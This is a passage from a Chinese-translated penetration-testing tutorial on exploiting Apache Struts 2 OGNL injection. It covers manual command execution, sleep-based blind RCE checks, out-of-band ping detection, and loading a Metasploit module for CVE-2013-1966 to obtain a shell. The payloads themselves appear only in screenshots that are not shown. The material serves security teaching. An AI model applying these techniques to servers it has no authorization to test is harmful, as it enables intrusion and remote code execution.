服务器将处理 OGNL 表达式，并在允许访问`DEFAULT_MEMBER_ACCESS`对象后，将调用我们的`Runtime().exec()`方法，该方法将执行我们的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/de663026-6b7e-4800-9c9b-d160ac8beaee.png)

`'id'`命令的输出将打印在`Location` HTTP 响应头中，如前面的屏幕截图所示。现在我们已经了解了 OGNL 表达式及其手动利用，让我们尝试使用 Metasploit 来利用它。

# 通过 OGNL 注入测试盲远程代码执行

这是一个不同的情景，服务器对 Apache Struts 2 **远程代码执行**（**RCE**）漏洞存在漏洞，但由于某种原因，代码执行响应被隐藏了。在这种情况下，我们仍然可以通过使用`sleep()`函数来确认 RCE 漏洞。类似于时间基本的 SQL 注入中使用的`sleep()`函数，我们可以使用此函数来检查响应时间。我们已经执行了`sleep()`函数 2,000 毫秒，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/133008cf-d3d2-4038-a118-469dfc9a4140.png)

要确认漏洞，我们只需查看服务器的响应时间，即服务器处理请求并发送响应的时间。对于这种情况，我们执行了`sleep()`函数 2,000 毫秒，服务器在 2,010 毫秒内响应了请求，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6f0c7306-26a9-4daa-8d8b-ef1cefc6bf77.png)

我们应该始终通过更改时间为不同的值来检查漏洞的存在。

# 测试 OGNL 带外注入

确认漏洞的另一种方法是执行与我们放置在组织外的自己的服务器进行交互的命令。要检查 OGNL **带外** (**OOB**)注入，我们可以执行一个简单的`ping`命令，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8911b640-c030-4405-b267-d0775ee5f557.png)

在将有效载荷发送到服务器之前，我们需要使用`tcpdump`在服务器的公共接口上进行监听。我们可以执行`tcpdump icmp host <ip>`命令来过滤服务器上的 ICMP `echo request`和`echo reply`数据包。我们需要这样做，这样当我们执行有效载荷时，我们可以在服务器上收到`ping`的 echo request，就像下面的截图中一样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cf7a5fbd-b7cd-4297-829b-48ed712332d6.png)

对于 OOB 交互，我们可以尝试不同的协议，如 HTTP、FTP、SSH 和 DNS。如果我们无法获得输出（盲目），并且要检查是否可能获得反向 shell 连接，那么 OOB 注入会有所帮助。

# 使用 Metasploit 进行 Struts 2 利用

现在我们已经手动利用了 Struts 2 的漏洞并清楚地理解了相关概念，我们将看到使用 Metasploit 利用相同漏洞有多么容易。使用 Metasploit 可以使利用变得更加容易。我们可以通过以下步骤搜索 Struts 上所有可用的模块：

1.  在 Metasploit 控制台中搜索`struts`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/160bd356-b5f6-415c-82cb-fb50948bf243.png)

1.  以下是一个运行 Apache Struts 的演示 Web 应用程序。该应用程序容易受到`S2-013`漏洞（CVE-2013-1966）的影响。让我们看看如何使用 Metasploit 来利用这个漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/aa4b7727-8ce7-49b0-a679-6c1ccd608137.png)

1.  我们通过在`msfconsole`中输入以下命令来加载 Metasploit exploit：

```
use/exploit/multi/http/struts_include_params
```

1.  通过输入`show options`命令，我们可以看到可用的选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/902fffb8-ec15-4e3d-bcd3-35530ed34d5d.png)

设置选项并运行 exploit 将给我们命令 shell。如果没有反向 shell 连接，我们需要执行简单的出站连接测试，以检查目标服务器是否允许所有端口的连接。如果防火墙阻止了出站连接，我们可以尝试通过 HTTP 隧道获取绑定连接。

# 总结

在本章中，我们介绍了 Tomcat 的基础知识，并了解了其架构和文件结构。然后，我们转向了识别 Tomcat 和检测版本号的不同技术。接下来，我们看了 JSP 和 WAR shell 上传的 Tomcat 利用。在本章的最后，我们介绍了 Apache Struts、OGNL 和 Tomcat 的利用。

在下一章中，我们将学习如何对另一个著名的技术平台 Jenkins 进行渗透测试。

# 问题

1.  在黑盒渗透测试的情况下，我们如何公开识别 Tomcat 服务器？

1.  **`Changelog.html`**文件是否总是存在于 Apache Tomcat 服务器上？

1.  我已成功将 JSP shell 上传到 Apache Tomcat 服务器。然而，我无法访问它。可能是什么问题？

1.  我发现了一个 OGNL OOB 注入。我该如何进一步利用这个漏洞？

# 进一步阅读

以下链接可用作进一步了解 Apache Tomcat 和 CVE 2019-0232 的参考：

+   [`blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/`](https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat/)

+   [`github.com/apache/tomcat`](https://github.com/apache/tomcat)
